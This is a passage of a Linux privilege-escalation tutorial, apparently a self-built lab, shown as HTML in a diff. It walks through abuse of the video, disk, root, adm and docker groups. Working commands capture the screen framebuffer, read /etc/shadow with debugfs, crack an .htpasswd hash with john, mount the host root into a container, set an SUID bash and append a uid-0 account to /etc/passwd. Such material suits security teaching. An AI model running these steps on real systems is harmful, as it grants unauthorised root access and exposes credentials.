+</div><p>Now capture the screenshot:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat /dev/fb0 &gt; /home/user/screenshot.raw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the file /tmp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -l /tmp/screenshot.raw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><a class="lightgallery" href="/images/posts/tty3-video-group.png" title="/images/posts/tty3-video-group.png" data-thumbnail="/images/posts/tty3-video-group.png" data-sub-html="<h2>TTY3 Video Group</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/tty3-video-group.png"
+            data-srcset="/images/posts/tty3-video-group.png, /images/posts/tty3-video-group.png 1.5x, /images/posts/tty3-video-group.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/tty3-video-group.png" />
+    </a><figcaption class="image-caption">TTY3 Video Group</figcaption>
+    </figure>
+<p>Click this button in VMware or just do <code>Ctrl+Alt+Delete</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/vmware-alt-del-video-group.png" title="/images/posts/vmware-alt-del-video-group.png" data-thumbnail="/images/posts/vmware-alt-del-video-group.png" data-sub-html="<h2>VMware Alt&#43;Del</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vmware-alt-del-video-group.png"
+            data-srcset="/images/posts/vmware-alt-del-video-group.png, /images/posts/vmware-alt-del-video-group.png 1.5x, /images/posts/vmware-alt-del-video-group.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vmware-alt-del-video-group.png" />
+    </a><figcaption class="image-caption">VMware Alt+Del</figcaption>
+    </figure>
+<p>We can view the files that the video group has:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/raw2png$ find / -group video 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/dev/dri/card0
+</span></span><span class="line"><span class="cl">/dev/fb0
+</span></span><span class="line"><span class="cl">user@pwn:~/raw2png$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The video group has access to view the screen output. we can observe the screens. To do that we need to grab the current image on the screen in raw data and get the resolution that the screen is using. The screen data can be saved in <code>/dev/fb0</code> and we could find the resolution of this screen on
+<code>/sys/class/graphics/fb0/virtual_size</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /sys/class/graphics/fb0/virtual_size
+</span></span><span class="line"><span class="cl">2048,2048
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then convert this to png:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ./iraw2png.pl <span class="m">2048</span> <span class="m">2048</span> &lt; /home/user/screenshot.raw &gt; screenshot.png
+</span></span><span class="line"><span class="cl">pnmtopng: <span class="m">5</span> colors found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now open the image:</p>
+<figure><a class="lightgallery" href="/images/posts/iraw2png-open-image.png" title="/images/posts/iraw2png-open-image.png" data-thumbnail="/images/posts/iraw2png-open-image.png" data-sub-html="<h2>iraw2png Open Image</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/iraw2png-open-image.png"
+            data-srcset="/images/posts/iraw2png-open-image.png, /images/posts/iraw2png-open-image.png 1.5x, /images/posts/iraw2png-open-image.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/iraw2png-open-image.png" />
+    </a><figcaption class="image-caption">iraw2png Open Image</figcaption>
+    </figure>
+<p>Alternatively, we can open the raw image with GIMP, and select the screen.raw file and select as file type Raw image data:</p>
+<figure><a class="lightgallery" href="/images/posts/gimp-raw.png" title="/images/posts/gimp-raw.png" data-thumbnail="/images/posts/gimp-raw.png" data-sub-html="<h2>GIMP Raw</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/gimp-raw.png"
+            data-srcset="/images/posts/gimp-raw.png, /images/posts/gimp-raw.png 1.5x, /images/posts/gimp-raw.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/gimp-raw.png" />
+    </a><figcaption class="image-caption">GIMP Raw</figcaption>
+    </figure>
+<p>Add the resolution size found in <code>cat /sys/class/graphics/fb0/virtual_size</code> and select the Image Type:</p>
+<figure><a class="lightgallery" href="/images/posts/gimp-image-type.png" title="/images/posts/gimp-image-type.png" data-thumbnail="/images/posts/gimp-image-type.png" data-sub-html="<h2>GIMP Image Type</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/gimp-image-type.png"
+            data-srcset="/images/posts/gimp-image-type.png, /images/posts/gimp-image-type.png 1.5x, /images/posts/gimp-image-type.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/gimp-image-type.png" />
+    </a><figcaption class="image-caption">GIMP Image Type</figcaption>
+    </figure>
+<p>Now we can see it in GIMP:</p>
+<figure><a class="lightgallery" href="/images/posts/gimp-video-group.png" title="/images/posts/gimp-video-group.png" data-thumbnail="/images/posts/gimp-video-group.png" data-sub-html="<h2>GIMP Video Group</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/gimp-video-group.png"
+            data-srcset="/images/posts/gimp-video-group.png, /images/posts/gimp-video-group.png 1.5x, /images/posts/gimp-video-group.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/gimp-video-group.png" />
+    </a><figcaption class="image-caption">GIMP Video Group</figcaption>
+    </figure>
+<p>Since we can see the password, we can escalate privileges by changing to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ su root
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the shadow group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user video
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-disk">Privilege Escalation via Disk</h1>
+<p>Disks can be managed via the disk group.</p>
+<p>Make the current user a member of the disk group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG disk user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This group grants us access to all of the machine&rsquo;s data.</p>
+<blockquote>
+<p>Files:<code>/dev/sd[a-z][1-9]</code></p>
+</blockquote>
+<p>Determine the location of the root folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ df -h <span class="p">|</span> grep <span class="s2">&#34;/</span>$<span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">/dev/sda5        20G  7.8G   11G  44% /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Connect to the mounted file system as follows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ debugfs /dev/sda5
+</span></span><span class="line"><span class="cl">debugfs 1.45.5
+</span></span><span class="line"><span class="cl">debugfs:  cat /etc/shadow
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>:18918:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The program <code>debugfs</code> allows us to write files as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">debugfs:  dump /etc/shadow /tmp/shadow.bak
+</span></span><span class="line"><span class="cl">debugfs:  quit
+</span></span><span class="line"><span class="cl">user@pwn:~$ ls -la /tmp/shadow.bak 
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user <span class="m">1565</span> Oct  <span class="m">7</span> 22:33 /tmp/shadow.bak
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /tmp/shadow.bak
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>:18918:0:99999:7:::
+</span></span><span class="line"><span class="cl">daemon:*:18667:0:99999:7:::
+</span></span><span class="line"><span class="cl">bin:*:18667:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the disk group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo gpasswd -d user disk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-root-group">Privilege Escalation via Root Group</h1>
+<p>The root group can read files and directories owned by the <code>root</code> user. We&rsquo;ll add the current user to the root group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG root user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By default members of the <code>root</code> group could have access to <strong>read</strong> some service configuration files, library files, backups, or other interesting data that could be used to escalate privileges.</p>
+<p>We could verify which files root members can modify or write:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -group root -perm -g<span class="o">=</span>w ! -type l 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span> <span class="p">|</span> xargs ls -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;re gonna startup by creating a scenario where they will be a password re-use misconfiguration. We&rsquo;ll do this by installing Apache service in victim system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install apache2 apache2-utils -y
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s create a <code>.htpasswd</code> file, by default, this configuration file is readable by everyone and it can have credentials so we are gonna create this file and add the same password as the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo htpasswd -c /etc/apache2/.htpasswd admin
+</span></span><span class="line"><span class="cl">New password: 
+</span></span><span class="line"><span class="cl">Re-type new password: 
+</span></span><span class="line"><span class="cl">Adding password <span class="k">for</span> user admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;ll remove the readable permissions for others:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo chmod o-r /etc/apache2/.htpasswd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now the file is readable by the root user and the root group only:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -l /etc/apache2/.htpasswd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we search from the whole system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -group root -perm -g<span class="o">=</span>r -type f 2&gt;/dev/null <span class="p">|</span> grep htpasswd <span class="p">|</span> xargs ls -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that we can read the file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/apache2/.htpasswd
+</span></span><span class="line"><span class="cl">admin:<span class="nv">$apr1$xxxxxxxxxxxxxxxxxxxxxxxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Go to your adversary host, we must single quotes (&rsquo;) when using echo to avoid character interpretation:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;admin:$apr1$xxxxxxxxxxxxxxxxxxx&#39;</span> &gt; hash.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we can escalate privileges by cracking this hash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We could then switch to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">su root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the root group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-adm-group">Privilege Escalation via Adm Group</h1>
+<p>The <code>adm</code> group allows us to read log files.</p>
+<p>Wel&rsquo;ll add the current user to the adm group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG adm user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Members of the group adm typically have access to log files placed in <code>/var/log/</code>. Let us look at which files we may read and write:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -group adm 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc&#39;</span> <span class="p">|</span> xargs ls -l 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>While not directly exploitable, logs can be leveraged to leak sensitive information such as user actions, vulnerable apps, and potentially hidden cron processes. Therefore, we will design a scenario in which we can find a password recorded in a log.</p>
+<p>Launch the apache2 service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl start apache2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let us create a log to save certain credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl http://127.0.0.1/reset_password?pwd<span class="o">=</span>this_is_a_password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can access this log file because we are in the admin group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -l /var/log/apache2/access.log 
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root adm <span class="m">0</span> Oct <span class="m">20</span> 10:04 /var/log/apache2/access.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Escalate privileges by reading the log and entering the found password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat /var/log/apache2/access.log 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Switch to the root user by using the password found:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">su root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the adm group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user adm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-docker-group">Privilege Escalation via Docker Group</h1>
+<p>Docker containers are managed by the docker group.</p>
+<p>Docker and the current user should be added to the docker group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install docker.io <span class="o">&amp;&amp;</span> sudo usermod -aG docker user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the docker group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getent group <span class="p">|</span> grep docker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Download the alpine image here:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ docker pull alpine
+</span></span><span class="line"><span class="cl">Using default tag: latest
+</span></span><span class="line"><span class="cl">latest: Pulling from library/alpine
+</span></span><span class="line"><span class="cl">a0d0a0d46f8b: Pull <span class="nb">complete</span> 
+</span></span><span class="line"><span class="cl">Digest: sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></span><span class="line"><span class="cl">Status: Downloaded newer image <span class="k">for</span> alpine:latest
+</span></span><span class="line"><span class="cl">docker.io/library/alpine:latest
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mount the root file system to the container&rsquo;s /mnt directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -v /:/mnt -it alpine /bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Options:</p>
+<ul>
+<li>-v = volume</li>
+<li>-it = interactive terminal</li>
+<li>alpine = docker image</li>
+</ul>
+<p>Alpine is 5MB in size:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ <span class="c1"># id</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1"># hostname</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1"># cd /mnt</span>
+</span></span><span class="line"><span class="cl">/mnt <span class="c1"># ls -la</span>
+</span></span><span class="line"><span class="cl">/mnt <span class="c1"># cat /mnt/etc/shadow</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add an SUID bit to bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/mnt # cp /mnt/usr/bin/bash /mnt/home/user/bash
+</span></span><span class="line"><span class="cl">/mnt # chmod u+s /mnt/home/user/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a new terminal in your host from the docker container and generate a hash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ openssl passwd -1 password
+</span></span><span class="line"><span class="cl"><span class="nv">$1$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add a new root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;toor:$1$xxxxxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/sh&#39;</span> &gt;&gt; /mnt/etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Exit from the container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/mnt <span class="c1"># exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Escalate privileges to root with SUID bash by passing the <code>-p</code> flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ /home/user/bash -p
+</span></span><span class="line"><span class="cl">bash-5.0# id
